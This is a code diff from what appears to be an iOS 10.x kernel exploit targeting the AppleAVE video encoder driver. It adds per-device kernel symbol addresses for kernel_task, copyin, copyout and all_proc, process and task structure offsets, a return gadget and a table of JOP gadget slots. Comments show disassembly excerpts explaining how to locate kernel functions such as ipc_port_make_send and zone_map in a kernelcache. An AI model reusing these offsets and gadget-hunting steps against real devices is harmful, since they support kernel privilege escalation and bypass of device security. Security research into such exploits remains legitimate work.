@@ -9,10 +9,22 @@
 #include <UIKit/UIKit.h>
 
 #include "apple_ave_utils.h"
+#include "kernel_call.h"
 
 static offsets_t g_offsets;
 static uint64_t g_kernel_base = 0;
 
+// kppless --
+unsigned offsetof_p_pid = 0x10;               // proc_t::p_pid
+unsigned offsetof_task = 0x18;                // proc_t::task
+unsigned offsetof_p_ucred = 0x100;            // proc_t::p_ucred
+unsigned offsetof_p_comm = 0x26c;             // proc_t::p_comm
+unsigned offsetof_p_csflags = 0x2a8;          // proc_t::p_csflags
+unsigned offsetof_itk_self = 0xD8;            // task_t::itk_self (convert_task_to_port)
+unsigned offsetof_itk_sself = 0xE8;           // task_t::itk_sself (task_get_special_port)
+unsigned offsetof_itk_bootstrap = 0x2b8;      // task_t::itk_bootstrap (task_get_special_port)
+unsigned offsetof_ip_mscount = 0x9C;          // ipc_port_t::ip_mscount (ipc_port_make_send)
+unsigned offsetof_ip_srights = 0xA0;          // ipc_port_t::ip_srights (ipc_port_make_send)
 
 /*
  * Function name: 	offsets_get_kernel_base
@@ -34,10 +46,13 @@ uint64_t offsets_get_kernel_base() {
 void offsets_set_kernel_base(uint64_t kernel_base) {
     
     g_kernel_base = kernel_base;
-    g_offsets.main_kernel_base = g_kernel_base - g_offsets.kernel_base - g_offsets.kernel_text;
+    g_offsets.main_kernel_base = g_kernel_base - g_offsets.kernel_base + g_offsets.kernel_text;
+    
+    printf("[INFO]: g_offsets.main_kernel_base: 0x%llx\n", g_offsets.main_kernel_base);
+    printf("[INFO]: g_kernel_base: 0x%llx\n", g_kernel_base);
+    printf("[INFO]: g_offsets.kernel_base: 0x%llx\n", g_offsets.kernel_base);
+    printf("[INFO]: g_offsets.kernel_text: 0x%llx\n", g_offsets.kernel_text);
 }
-
-
 
 
 /*
@@ -57,20 +72,33 @@ kern_return_t set_driver_offsets (char * driver_name) {
 
     g_offsets.driver_name = driver_name;
 
-    if(strcmp(driver_name, "AppleAVE2Driver") == 0) {
+    if(strcmp(driver_name, "AppleAVEDriver") == 0) {
+        
+        g_offsets.add_client_input_buffer_size = 0x4;
         
         g_offsets.encode_frame_input_buffer_size = 0x300;
         g_offsets.encode_frame_output_buffer_size = 0x1E8;
         
+
     } else if(strcmp(driver_name, "AppleVXE380Driver") == 0) {
         
+        g_offsets.add_client_input_buffer_size = 0x4;
+
         g_offsets.encode_frame_input_buffer_size = 0x650;
         g_offsets.encode_frame_output_buffer_size = 0x130;
         
-    } else if(strcmp(driver_name, "AppleAVEDriver") == 0) {
+    } else if(strcmp(driver_name, "AppleAVE2Driver") == 0) {
         
-        g_offsets.encode_frame_input_buffer_size = 0x300;
-        g_offsets.encode_frame_output_buffer_size = 0x1E8;
+        g_offsets.add_client_input_buffer_size = 0x8;
+        
+//        g_offsets.encode_frame_input_buffer_size = 0x470;
+//        g_offsets.encode_frame_output_buffer_size = 0x2E0;
+
+        
+        // TODO: this is temporary (10.3.2) pls replace with above ^
+        g_offsets.encode_frame_input_buffer_size = 0x188;
+        g_offsets.encode_frame_output_buffer_size = 0x4;
+  
         
     } else {
         
@@ -82,7 +110,6 @@ kern_return_t set_driver_offsets (char * driver_name) {
     return KERN_SUCCESS;
 }
 
-typedef void (*init_func)(void);
 
 void init_default(){
     
@@ -213,296 +240,609 @@ void init_default(){
     
     
     // TODO: Find offsets for each device instead
-    g_offsets.main_kernel_base = 0xfffffff000000000;
+    g_offsets.main_kernel_base = 0xFFFFFFF007004000;
     g_offsets.kernel_task = 0xfffffff0075c2050 - g_offsets.kernel_base;
     g_offsets.realhost = 0xfffffff007548a98 - g_offsets.kernel_base;
+    
+    
+    /* look for nullsub_1 */
+    g_offsets.ret_gadget = 0xfffffff000000000 - g_offsets.kernel_base;
+    
+    /* use joker -m path_to_decrypted_kernelcache
+       you should get the mach_vm_subsystem with _Xmach_vm_wire
+     EDIT: it's probably the subroutine right after the end of mach_vm_remap (IT IS!)
+     */
+    g_offsets.mach_vm_wire = 0xfffffff000000000 - g_offsets.kernel_base;
+
+    /* look for "Couldn't allocate send right for fileport!" and follow the caller
+     
+    __TEXT_EXEC:__text:FFFFFFF007387AE4                 BL              ipc_port_make_send <-- the function we need
+    __TEXT_EXEC:__text:FFFFFFF007387AE8                 ADD             X8, X0, #1
+    __TEXT_EXEC:__text:FFFFFFF007387AEC                 CMP             X8, #1
+    __TEXT_EXEC:__text:FFFFFFF007387AF0                 B.LS            loc_FFFFFFF007387B98 <-- branch
+     
+     Example shown using i6(N61) 10.2.1 - 14D27
+    */
+    g_offsets.ipc_port_make_send = 0xfffffff000000000 - g_offsets.kernel_base;
+    
+    /* look for "ipc_clock_init" (reference: ipc_clock.c in XNU's source code)
+       then choose the 2nd caller - should be something like this:
+     
+     __TEXT_EXEC:__text:FFFFFFF0070D6428                 BL              ipc_port_alloc_special <-- the function we need
+     __TEXT_EXEC:__text:FFFFFFF0070D642C                 CBZ             X0, loc_FFFFFFF0070D9098
+     __TEXT_EXEC:__text:FFFFFFF0070D6430                 ADRP            X19, #off_FFFFFFF007524108@PAGE
+     __TEXT_EXEC:__text:FFFFFFF0070D6434                 ADD             X19, X19, #off_FFFFFFF007524108@PAGEOFF
+     __TEXT_EXEC:__text:FFFFFFF0070D6438                 STR             X0, [X19,#(qword_FFFFFFF007524110 - 0xFFFFFFF007524108)]
+     __TEXT_EXEC:__text:FFFFFFF0070D643C                 LDR             X0, [X20,#qword_FFFFFFF007547308@PAGEOFF]
+     __TEXT_EXEC:__text:FFFFFFF0070D6440                 BL              ipc_port_alloc_special <-- the function we need
+     __TEXT_EXEC:__text:FFFFFFF0070D6444                 CBZ             X0, loc_FFFFFFF0070D9098
+     Example shown using i6(N61) 10.2.1 - 14D27
+     */
+    g_offsets.ipc_port_alloc_special = 0xfffffff000000000 - g_offsets.kernel_base;
+    
+    /* look for "ipc_kobject_server: strange destination rights" (reference: ipc_kobject.c:402)
+       the caller function should be something like this:
+     __TEXT_EXEC:__text:FFFFFFF00709F074                 B.NE            loc_FFFFFFF0070A057C
+     __TEXT_EXEC:__text:FFFFFFF00709F078                 LDR             X0, [X23,#8]
+     __TEXT_EXEC:__text:FFFFFFF00709F07C                 BL              _ipc_port_release_send
+     __TEXT_EXEC:__text:FFFFFFF00709F080                 B               loc_FFFFFFF00709F08C
+     ....
+     _TEXT_EXEC:__text:FFFFFFF00709F0F8                 B.LS            loc_FFFFFFF00709FE80
+     __TEXT_EXEC:__text:FFFFFFF00709F0FC                 LDR             X10, [X10,#0x60]
+     __TEXT_EXEC:__text:FFFFFFF00709F100                 ADRP            X11, #ipc_space_kernel@PAGE <-- ipc_space_kernel
+     __TEXT_EXEC:__text:FFFFFFF00709F104                 LDR             X11, [X11,#ipc_space_kernel@PAGEOFF]
+     Example shown using i6(N61) 10.2.1 - 14D27
+     */
+    g_offsets.ipc_space_kernel = 0xfffffff000000000 - g_offsets.kernel_base;
+    
+    /* look for function "_host_get_exception_ports".. the function right after it is ipc_kobject_set */
+    g_offsets.ipc_kobject_set = 0xfffffff000000000 - g_offsets.kernel_base;
+
+    
+    /* look for 'mount_common(): mount of %s filesystem failed with %d, but vnode list is not empty.'
+       and follow the main function
+    */
+    g_offsets.mount_common = 0xfffffff000000000 - g_offsets.kernel_base;
+    
+    /*
+        Look for 'zone_init: kmem_suballoc failed':
+         __TEXT_EXEC:__text:FFFFFFF0070D51B8 loc_FFFFFFF0070D51B8                    ; CODE XREF: __TEXT_EXEC:__text:FFFFFFF0070D1AA8↑j
+         __TEXT_EXEC:__text:FFFFFFF0070D51B8                 ADR             X0, aZoneInitKmemSu ; "\"zone_init: kmem_suballoc failed\""
+         __TEXT_EXEC:__text:FFFFFFF0070D51BC                 NOP
+         __TEXT_EXEC:__text:FFFFFFF0070D51C0                 BL              _panic
+         
+        Go to the address referencing that (should be a CBNZ)
+        There should be a ADRP before that CBNZ, right after ADRP, you'll see an ADD
+        Use the address address of X5 (address in add x5 + the address in adrp x5):
+         __TEXT_EXEC:__text:FFFFFFF0070D1A84                 LDR             X0, [X22,#_kernel_map@PAGEOFF]
+         __TEXT_EXEC:__text:FFFFFFF0070D1A88                 ADRP            X5, #0xFFFFFFF007558000 <-------
+         __TEXT_EXEC:__text:FFFFFFF0070D1A8C                 ADD             X5, X5, #0x478 <-------
+         __TEXT_EXEC:__text:FFFFFFF0070D1A90                 MOV             W4, #0xC000000
+         __TEXT_EXEC:__text:FFFFFFF0070D1A94                 MOVK            W4, #0x101
+         __TEXT_EXEC:__text:FFFFFFF0070D1A98                 ADD             X1, SP, #0x68
+         __TEXT_EXEC:__text:FFFFFFF0070D1A9C                 MOV             W3, #0
+         __TEXT_EXEC:__text:FFFFFFF0070D1AA0                 MOV             X2, X20
+         __TEXT_EXEC:__text:FFFFFFF0070D1AA4                 BL              sub_FFFFFFF00712E0F0
+         __TEXT_EXEC:__text:FFFFFFF0070D1AA8                 CBNZ            W0, loc_FFFFFFF0070D51B8
+        Example shown using i6 10.3.1
+     */
+    g_offsets.zone_map = 0xFFFFFFF007558478 - g_offsets.kernel_base;
+    
+    
+    // 10.2.1 has size of 0x338
+    g_offsets.iosurface_kernel_object_size = 0x350;
+    
+    
+    // JOP stuff
+    g_offsets.jop_GADGET_PROLOGUE_1                = 0;
+    g_offsets.jop_LDP_X2_X1_X1__BR_X2              = 0;
+    g_offsets.jop_MOV_X23_X0__BLR_X8               = 0;
+    g_offsets.jop_GADGET_INITIALIZE_X20_1          = 0;
+    g_offsets.jop_MOV_X25_X0__BLR_X8               = 0;
+    g_offsets.jop_GADGET_POPULATE_1                = 0;
+    g_offsets.jop_MOV_X19_X9__BR_X8                = 0;
+    g_offsets.jop_MOV_X20_X12__BR_X8               = 0;
+    g_offsets.jop_MOV_X21_X5__BLR_X8               = 0;
+    g_offsets.jop_MOV_X22_X6__BLR_X8               = 0;
+    g_offsets.jop_MOV_X0_X3__BLR_X8                = 0;
+    g_offsets.jop_MOV_X24_X4__BR_X8                = 0;
+    g_offsets.jop_MOV_X8_X10__BR_X11               = 0;
+    g_offsets.jop_GADGET_CALL_FUNCTION_1           = 0;
+    g_offsets.jop_GADGET_STORE_RESULT_1            = 0;
+    g_offsets.jop_GADGET_EPILOGUE_1                = 0;
+    g_offsets.jop_GADGET_PROLOGUE_2                = 0;
+    g_offsets.jop_MOV_X25_X19__BLR_X8              = 0;
+    g_offsets.jop_GADGET_POPULATE_2                = 0;
+    g_offsets.jop_MOV_X19_X5__BLR_X8               = 0;
+    g_offsets.jop_MOV_X20_X19__BR_X8               = 0;
+    g_offsets.jop_MOV_X5_X6__BLR_X8                = 0;
+    g_offsets.jop_MOV_X21_X11__BLR_X8              = 0;
+    g_offsets.jop_MOV_X22_X9__BLR_X8               = 0;
+    g_offsets.jop_MOV_X8_X10__BR_X12               = 0;
+    g_offsets.jop_GADGET_EPILOGUE_2                = 0;
 }
 
-void init_RELEASE_ARM64_T8010_1630_37894221() {
-    g_offsets.kernel_base = 0xfffffff005e64000;
-    g_offsets.l1icachesize_string = 0xfffffff00704b860 - g_offsets.kernel_base;
-    g_offsets.osserializer_serialize = 0xfffffff007491a60 - g_offsets.kernel_base;
-    g_offsets.kern_proc = 0xfffffff0075f60e0 - g_offsets.kernel_base;
-    g_offsets.cachesize_callback = 0xfffffff0073f5814 - g_offsets.kernel_base;
-    g_offsets.kernel_base = 0xfffffff005e64000 - g_offsets.kernel_base;
-    g_offsets.sysctl_hw_family = 0xfffffff00756e678 - g_offsets.kernel_base;
-    g_offsets.ret_gadget = 0xfffffff0063abda0 - g_offsets.kernel_base;
-    g_offsets.iofence_vtable_offset = 0xfffffff006e51548 - g_offsets.kernel_base;
-    g_offsets.l1dcachesize_handler = 0xfffffff00756e628 - g_offsets.kernel_base;
-    g_offsets.l1dcachesize_string = 0xfffffff00704b86d - g_offsets.kernel_base;
-    g_offsets.copyin = 0xfffffff0071c857c - g_offsets.kernel_base;
-    g_offsets.all_proc = 0xfffffff0075f0478 - g_offsets.kernel_base;
-    g_offsets.copyout = 0xfffffff0071c885c - g_offsets.kernel_base;
-    g_offsets.panic = 0xfffffff0070efcec - g_offsets.kernel_base;
-    g_offsets.quad_format_string = 0xfffffff00705d5d1 - g_offsets.kernel_base;
-    g_offsets.null_terminator = 0xfffffff00705e416 - g_offsets.kernel_base;
+// iPad Air 1 (J72AP) - iOS 10.2 (14C92)
+void set_j71ap_10_2() {
+    g_offsets.kernel_base = 0xfffffff006194000; // same
+    g_offsets.kernel_task = 0xFFFFFFF0075B6050 - g_offsets.kernel_base; // updated
+    g_offsets.realhost = 0xFFFFFFF00753CA98 - g_offsets.kernel_base; // updated
+    g_offsets.kernel_text = 0xFFFFFFF007004000; // same
+    g_offsets.l1icachesize_string = 0xfffffff00704b893 - g_offsets.kernel_base; // same
+    g_offsets.osserializer_serialize = 0xfffffff00744ee4c - g_offsets.kernel_base; // same
+    g_offsets.kern_proc = 0xFFFFFFF0075B60E0 - g_offsets.kernel_base; // updated
+    g_offsets.cachesize_callback = 0xfffffff0073b1ff4 - g_offsets.kernel_base; // same
+    g_offsets.sysctl_hw_family = 0xfffffff00752e678 - g_offsets.kernel_base; // same
+    g_offsets.ret_gadget = 0xFFFFFFF0070A9418 - g_offsets.kernel_base; // updated
+    g_offsets.iofence_vtable_offset = 0xFFFFFFF006F32A08 - g_offsets.kernel_base; // updated
+    g_offsets.l1dcachesize_handler = 0xfffffff00752e628 - g_offsets.kernel_base; // same
+    g_offsets.l1dcachesize_string = 0xfffffff00704b8a0 - g_offsets.kernel_base; // same
+    g_offsets.copyin = 0xfffffff0071835b8 - g_offsets.kernel_base; // same
+    g_offsets.all_proc = 0xfffffff0075b0418 - g_offsets.kernel_base; // same
+    g_offsets.copyout = 0xfffffff0071837c0 - g_offsets.kernel_base; // same
+    g_offsets.panic = 0xfffffff0070aac30 - g_offsets.kernel_base; // same
+    g_offsets.quad_format_string = 0xfffffff00705d611 - g_offsets.kernel_base; // same
+    g_offsets.null_terminator = 0xfffffff00705e411 - g_offsets.kernel_base; // same
 }
-void init_RELEASE_ARM64_S5L8960X_1650_37895227() {
-    g_offsets.kernel_base = 0xfffffff006190000;
-    g_offsets.l1icachesize_string = 0xfffffff00704ba73 - g_offsets.kernel_base;
-    g_offsets.osserializer_serialize = 0xfffffff007441424 - g_offsets.kernel_base;
-    g_offsets.kern_proc = 0xfffffff0075a80c8 - g_offsets.kernel_base;
-    g_offsets.cachesize_callback = 0xfffffff0073a7878 - g_offsets.kernel_base;
-    g_offsets.kernel_base = 0xfffffff006190000 - g_offsets.kernel_base;
-    g_offsets.sysctl_hw_family = 0xfffffff00751e320 - g_offsets.kernel_base;
-    g_offsets.ret_gadget = 0xfffffff0064d1f70 - g_offsets.kernel_base;
-    g_offsets.iofence_vtable_offset = 0xfffffff006f248a0 - g_offsets.kernel_base;
-    g_offsets.l1dcachesize_handler = 0xfffffff00751e370 - g_offsets.kernel_base;
-    g_offsets.l1dcachesize_string = 0xfffffff00704ba80 - g_offsets.kernel_base;
-    g_offsets.copyin = 0xfffffff007181218 - g_offsets.kernel_base;
-    g_offsets.all_proc = 0xfffffff0075a26a0 - g_offsets.kernel_base;
-    g_offsets.copyout = 0xfffffff00718140c - g_offsets.kernel_base;
-    g_offsets.panic = 0xfffffff0070aa818 - g_offsets.kernel_base;
-    g_offsets.quad_format_string = 0xfffffff00705ddd1 - g_offsets.kernel_base;
-    g_offsets.null_terminator = 0xfffffff00705e3f9 - g_offsets.kernel_base;
+
+
+// iPod Touch 6 (N102AP) - iOS 10.2.1 (14D27)
+void set_n102ap_10_2_1() {
+    g_offsets.kernel_base = 0xFFFFFFF006144000; // added
+    g_offsets.kernel_task = 0xFFFFFFF0075C2050 - g_offsets.kernel_base; // same
+    g_offsets.realhost = 0xFFFFFFF007548A98 - g_offsets.kernel_base; // same
+    g_offsets.kernel_text = 0xFFFFFFF007004000; // same
+    g_offsets.l1icachesize_string = 0xfffffff007057883 - g_offsets.kernel_base; // same
+    g_offsets.osserializer_serialize = 0xFFFFFFF00745B100 - g_offsets.kernel_base; // updated
+    g_offsets.kern_proc = 0xFFFFFFF0075C20E0 - g_offsets.kernel_base; // same
+    g_offsets.cachesize_callback = 0xFFFFFFF0073BE2A8 - g_offsets.kernel_base; // updated
+    g_offsets.sysctl_hw_family = 0xFFFFFFF00753A678 - g_offsets.kernel_base; // updated
+    g_offsets.ret_gadget = 0xFFFFFFF0070B55B8 - g_offsets.kernel_base; // updated
+    g_offsets.iofence_vtable_offset = 0xFFFFFFF006EF9688 - g_offsets.kernel_base; // updated
+    g_offsets.l1dcachesize_handler = 0xfffffff00753a628 - g_offsets.kernel_base; // updated
+    g_offsets.l1dcachesize_string = 0xfffffff007057890 - g_offsets.kernel_base; // updated
+    g_offsets.copyin = 0xFFFFFFF00718F76C - g_offsets.kernel_base; // updated
+    g_offsets.all_proc = 0xFFFFFFF0075BC468 - g_offsets.kernel_base; // updated
+    g_offsets.copyout = 0xFFFFFFF00718F974 - g_offsets.kernel_base; // updated
+    g_offsets.panic = 0xfffffff0070b6dd0 - g_offsets.kernel_base; // same
+    g_offsets.quad_format_string = 0xfffffff007069601 - g_offsets.kernel_base; // same
+    g_offsets.null_terminator = 0xfffffff00706a407 - g_offsets.kernel_base; // same
 }
-void init_RELEASE_ARM64_T8010_1650_37895227() {
-    g_offsets.kernel_base = 0xfffffff005e1c000;
-    g_offsets.l1icachesize_string = 0xfffffff00704ba51 - g_offsets.kernel_base;
-    g_offsets.osserializer_serialize = 0xfffffff007486530 - g_offsets.kernel_base;
-    g_offsets.kern_proc = 0xfffffff0075ec0c8 - g_offsets.kernel_base;
-    g_offsets.cachesize_callback = 0xfffffff0073ec9e0 - g_offsets.kernel_base;
-    g_offsets.kernel_base = 0xfffffff005e1c000 - g_offsets.kernel_base;
-    g_offsets.sysctl_hw_family = 0xfffffff007562320 - g_offsets.kernel_base;
-    g_offsets.ret_gadget = 0xfffffff0063abf70 - g_offsets.kernel_base;
-    g_offsets.iofence_vtable_offset = 0xfffffff006e495a0 - g_offsets.kernel_base;
-    g_offsets.l1dcachesize_handler = 0xfffffff007562370 - g_offsets.kernel_base;
-    g_offsets.l1dcachesize_string = 0xfffffff00704ba5e - g_offsets.kernel_base;
-    g_offsets.copyin = 0xfffffff0071c6134 - g_offsets.kernel_base;
-    g_offsets.all_proc = 0xfffffff0075e66f0 - g_offsets.kernel_base;
-    g_offsets.copyout = 0xfffffff0071c6414 - g_offsets.kernel_base;
-    g_offsets.panic = 0xfffffff0070ef8f8 - g_offsets.kernel_base;
-    g_offsets.quad_format_string = 0xfffffff00705dda2 - g_offsets.kernel_base;
-    g_offsets.null_terminator = 0xfffffff00705e40f - g_offsets.kernel_base;
-}
-void init_RELEASE_ARM64_T7001_1650_37895227() {
-    g_offsets.kernel_base = 0xfffffff006038000;
-    g_offsets.l1icachesize_string = 0xfffffff007057a83 - g_offsets.kernel_base;
-    g_offsets.osserializer_serialize = 0xfffffff00744d8d0 - g_offsets.kernel_base;
-    g_offsets.kern_proc = 0xfffffff0075b40c8 - g_offsets.kernel_base;
-    g_offsets.cachesize_callback = 0xfffffff0073b3d24 - g_offsets.kernel_base;
-    g_offsets.kernel_base = 0xfffffff006038000 - g_offsets.kernel_base;
-    g_offsets.sysctl_hw_family = 0xfffffff00752a320 - g_offsets.kernel_base;
-    g_offsets.ret_gadget = 0xfffffff006405f70 - g_offsets.kernel_base;
-    g_offsets.iofence_vtable_offset = 0xfffffff006ecd0a0 - g_offsets.kernel_base;
-    g_offsets.l1dcachesize_handler = 0xfffffff00752a370 - g_offsets.kernel_base;
-    g_offsets.l1dcachesize_string = 0xfffffff007057a90 - g_offsets.kernel_base;
-    g_offsets.copyin = 0xfffffff00718d4a0 - g_offsets.kernel_base;
-    g_offsets.all_proc = 0xfffffff0075ae7a0 - g_offsets.kernel_base;
-    g_offsets.copyout = 0xfffffff00718d694 - g_offsets.kernel_base;
-    g_offsets.panic = 0xfffffff0070b69b8 - g_offsets.kernel_base;
-    g_offsets.quad_format_string = 0xfffffff007069de1 - g_offsets.kernel_base;
-    g_offsets.null_terminator = 0xfffffff00706a40f - g_offsets.kernel_base;
-}
-void init_RELEASE_ARM64_T7001_1630_37893214() {
-    g_offsets.kernel_base = 0xfffffff006070000;
-    g_offsets.l1icachesize_string = 0xfffffff007057883 - g_offsets.kernel_base;
-    g_offsets.osserializer_serialize = 0xfffffff00745b300 - g_offsets.kernel_base;
-    g_offsets.kern_proc = 0xfffffff0075c20e0 - g_offsets.kernel_base;
-    g_offsets.cachesize_callback = 0xfffffff0073be4a8 - g_offsets.kernel_base;
-    g_offsets.kernel_base = 0xfffffff006070000 - g_offsets.kernel_base;
-    g_offsets.sysctl_hw_family = 0xfffffff00753a678 - g_offsets.kernel_base;
-    g_offsets.ret_gadget = 0xfffffff006401da0 - g_offsets.kernel_base;
-    g_offsets.iofence_vtable_offset = 0xfffffff006ed8748 - g_offsets.kernel_base;
-    g_offsets.l1dcachesize_handler = 0xfffffff00753a628 - g_offsets.kernel_base;
-    g_offsets.l1dcachesize_string = 0xfffffff007057890 - g_offsets.kernel_base;
-    g_offsets.copyin = 0xfffffff00718f840 - g_offsets.kernel_base;
-    g_offsets.all_proc = 0xfffffff0075bc528 - g_offsets.kernel_base;
-    g_offsets.copyout = 0xfffffff00718fa48 - g_offsets.kernel_base;
-    g_offsets.panic = 0xfffffff0070b6dd0 - g_offsets.kernel_base;
-    g_offsets.quad_format_string = 0xfffffff007069601 - g_offsets.kernel_base;
-    g_offsets.null_terminator = 0xfffffff00706a407 - g_offsets.kernel_base;
-}
-void init_RELEASE_ARM64_S8000_1630_37893214() {
-    g_offsets.kernel_base = 0xfffffff00605c000;
-    g_offsets.l1icachesize_string = 0xfffffff00704b885 - g_offsets.kernel_base;
-    g_offsets.osserializer_serialize = 0xfffffff00744df5c - g_offsets.kernel_base;
-    g_offsets.kern_proc = 0xfffffff0075b20e0 - g_offsets.kernel_base;
-    g_offsets.cachesize_callback = 0xfffffff0073b1104 - g_offsets.kernel_base;
-    g_offsets.kernel_base = 0xfffffff00605c000 - g_offsets.kernel_base;
-    g_offsets.sysctl_hw_family = 0xfffffff00752a678 - g_offsets.kernel_base;
-    g_offsets.ret_gadget = 0xfffffff006411da0 - g_offsets.kernel_base;
-    g_offsets.iofence_vtable_offset = 0xfffffff006e83b88 - g_offsets.kernel_base;
-    g_offsets.l1dcachesize_handler = 0xfffffff00752a628 - g_offsets.kernel_base;
-    g_offsets.l1dcachesize_string = 0xfffffff00704b892 - g_offsets.kernel_base;
-    g_offsets.copyin = 0xfffffff007182acc - g_offsets.kernel_base;
-    g_offsets.all_proc = 0xfffffff0075ac438 - g_offsets.kernel_base;
-    g_offsets.copyout = 0xfffffff007182cd4 - g_offsets.kernel_base;
-    g_offsets.panic = 0xfffffff0070aabb0 - g_offsets.kernel_base;
-    g_offsets.quad_format_string = 0xfffffff00705d603 - g_offsets.kernel_base;
-    g_offsets.null_terminator = 0xfffffff00705e409 - g_offsets.kernel_base;
-}
-void init_RELEASE_ARM64_T7000_1630_37894221() {
-    g_offsets.kernel_base = 0xfffffff006144000;
-    g_offsets.l1icachesize_string = 0xfffffff007057883 - g_offsets.kernel_base;
-    g_offsets.osserializer_serialize = 0xfffffff00745b100 - g_offsets.kernel_base;
-    g_offsets.kern_proc = 0xfffffff0075c20e0 - g_offsets.kernel_base;
-    g_offsets.cachesize_callback = 0xfffffff0073be2a8 - g_offsets.kernel_base;
-    g_offsets.kernel_base = 0xfffffff006144000 - g_offsets.kernel_base;
-    g_offsets.sysctl_hw_family = 0xfffffff00753a678 - g_offsets.kernel_base;
-    g_offsets.ret_gadget = 0xfffffff0064b9da0 - g_offsets.kernel_base;
-    g_offsets.iofence_vtable_offset = 0xfffffff006ef9688 - g_offsets.kernel_base;
-    g_offsets.l1dcachesize_handler = 0xfffffff00753a628 - g_offsets.kernel_base;
-    g_offsets.l1dcachesize_string = 0xfffffff007057890 - g_offsets.kernel_base;
-    g_offsets.copyin = 0xfffffff00718f76c - g_offsets.kernel_base;
-    g_offsets.all_proc = 0xfffffff0075bc468 - g_offsets.kernel_base;
-    g_offsets.copyout = 0xfffffff00718f974 - g_offsets.kernel_base;
-    g_offsets.panic = 0xfffffff0070b6dd0 - g_offsets.kernel_base;
-    g_offsets.quad_format_string = 0xfffffff007069601 - g_offsets.kernel_base;
-    g_offsets.null_terminator = 0xfffffff00706a407 - g_offsets.kernel_base;
-}
-// iPad Air
-void init_RELEASE_ARM64_S5L8960X_1630_37893214() {
-    g_offsets.kernel_base = 0xfffffff006194000;
-    g_offsets.l1icachesize_string = 0xfffffff00704b893 - g_offsets.kernel_base;
-    g_offsets.osserializer_serialize = 0xfffffff00744ee4c - g_offsets.kernel_base;
-    g_offsets.kern_proc = 0xfffffff0075b60e0 - g_offsets.kernel_base;
-    g_offsets.cachesize_callback = 0xfffffff0073b1ff4 - g_offsets.kernel_base;
-    g_offsets.kernel_base = 0xfffffff0061bc000 - g_offsets.kernel_base;
-    g_offsets.sysctl_hw_family = 0xfffffff00752e678 - g_offsets.kernel_base;
-    g_offsets.ret_gadget = 0xfffffff0064c1da0 - g_offsets.kernel_base;
-    g_offsets.iofence_vtable_offset = 0xfffffff006f2bd88 - g_offsets.kernel_base;
-    g_offsets.l1dcachesize_handler = 0xfffffff00752e628 - g_offsets.kernel_base;
-    g_offsets.l1dcachesize_string = 0xfffffff00704b8a0 - g_offsets.kernel_base;
-    g_offsets.copyin = 0xfffffff0071835b8 - g_offsets.kernel_base;
-    g_offsets.all_proc = 0xfffffff0075b0418 - g_offsets.kernel_base;
-    g_offsets.copyout = 0xfffffff0071837c0 - g_offsets.kernel_base;
-    g_offsets.panic = 0xfffffff0070aac30 - g_offsets.kernel_base;
-    g_offsets.quad_format_string = 0xfffffff00705d611 - g_offsets.kernel_base;
-    g_offsets.null_terminator = 0xfffffff00705e411 - g_offsets.kernel_base;
-}
-void init_RELEASE_ARM64_T7000_1650_37895227() {
-    g_offsets.kernel_base = 0xfffffff006118000;
-    g_offsets.l1icachesize_string = 0xfffffff007057a83 - g_offsets.kernel_base;
-    g_offsets.osserializer_serialize = 0xfffffff00744d6ac - g_offsets.kernel_base;
-    g_offsets.kern_proc = 0xfffffff0075b40c8 - g_offsets.kernel_base;
-    g_offsets.cachesize_callback = 0xfffffff0073b3b00 - g_offsets.kernel_base;
-    g_offsets.kernel_base = 0xfffffff006118000 - g_offsets.kernel_base;
-    g_offsets.sysctl_hw_family = 0xfffffff00752a320 - g_offsets.kernel_base;
-    g_offsets.ret_gadget = 0xfffffff0064c9f70 - g_offsets.kernel_base;
-    g_offsets.iofence_vtable_offset = 0xfffffff006ef20e0 - g_offsets.kernel_base;
-    g_offsets.l1dcachesize_handler = 0xfffffff00752a370 - g_offsets.kernel_base;
-    g_offsets.l1dcachesize_string = 0xfffffff007057a90 - g_offsets.kernel_base;
-    g_offsets.copyin = 0xfffffff00718d3a8 - g_offsets.kernel_base;
-    g_offsets.all_proc = 0xfffffff0075ae6e0 - g_offsets.kernel_base;
-    g_offsets.copyout = 0xfffffff00718d59c - g_offsets.kernel_base;
-    g_offsets.panic = 0xfffffff0070b69b8 - g_offsets.kernel_base;
-    g_offsets.quad_format_string = 0xfffffff007069de1 - g_offsets.kernel_base;
-    g_offsets.null_terminator = 0xfffffff00706a40f - g_offsets.kernel_base;
-}
-void init_RELEASE_ARM64_S8000_1650_37895227() {
-    g_offsets.kernel_base = 0xfffffff00601c000;
-    g_offsets.l1icachesize_string = 0xfffffff00704ba85 - g_offsets.kernel_base;
-    g_offsets.osserializer_serialize = 0xfffffff00744053c - g_offsets.kernel_base;
-    g_offsets.kern_proc = 0xfffffff0075a40c8 - g_offsets.kernel_base;
-    g_offsets.cachesize_callback = 0xfffffff0073a6990 - g_offsets.kernel_base;
-    g_offsets.kernel_base = 0xfffffff00601c000 - g_offsets.kernel_base;
-    g_offsets.sysctl_hw_family = 0xfffffff00751a320 - g_offsets.kernel_base;
-    g_offsets.ret_gadget = 0xfffffff006411f70 - g_offsets.kernel_base;
-    g_offsets.iofence_vtable_offset = 0xfffffff006e7bd60 - g_offsets.kernel_base;
-    g_offsets.l1dcachesize_handler = 0xfffffff00751a370 - g_offsets.kernel_base;
-    g_offsets.l1dcachesize_string = 0xfffffff00704ba92 - g_offsets.kernel_base;
-    g_offsets.copyin = 0xfffffff007180720 - g_offsets.kernel_base;
-    g_offsets.all_proc = 0xfffffff00759e6c0 - g_offsets.kernel_base;
-    g_offsets.copyout = 0xfffffff007180914 - g_offsets.kernel_base;
-    g_offsets.panic = 0xfffffff0070aa798 - g_offsets.kernel_base;
-    g_offsets.quad_format_string = 0xfffffff00705dde3 - g_offsets.kernel_base;
-    g_offsets.null_terminator = 0xfffffff00705e411 - g_offsets.kernel_base;
-}
-void init_RELEASE_ARM64_T7001_1630_37894221() {
-    g_offsets.kernel_base = 0xfffffff006070000;
-    g_offsets.l1icachesize_string = 0xfffffff007057883 - g_offsets.kernel_base;
-    g_offsets.osserializer_serialize = 0xfffffff00745b324 - g_offsets.kernel_base;
-    g_offsets.kern_proc = 0xfffffff0075c20e0 - g_offsets.kernel_base;
-    g_offsets.cachesize_callback = 0xfffffff0073be4cc - g_offsets.kernel_base;
-    g_offsets.kernel_base = 0xfffffff006070000 - g_offsets.kernel_base;
-    g_offsets.sysctl_hw_family = 0xfffffff00753a678 - g_offsets.kernel_base;
-    g_offsets.ret_gadget = 0xfffffff006401da0 - g_offsets.kernel_base;
-    g_offsets.iofence_vtable_offset = 0xfffffff006ed8748 - g_offsets.kernel_base;
-    g_offsets.l1dcachesize_handler = 0xfffffff00753a628 - g_offsets.kernel_base;
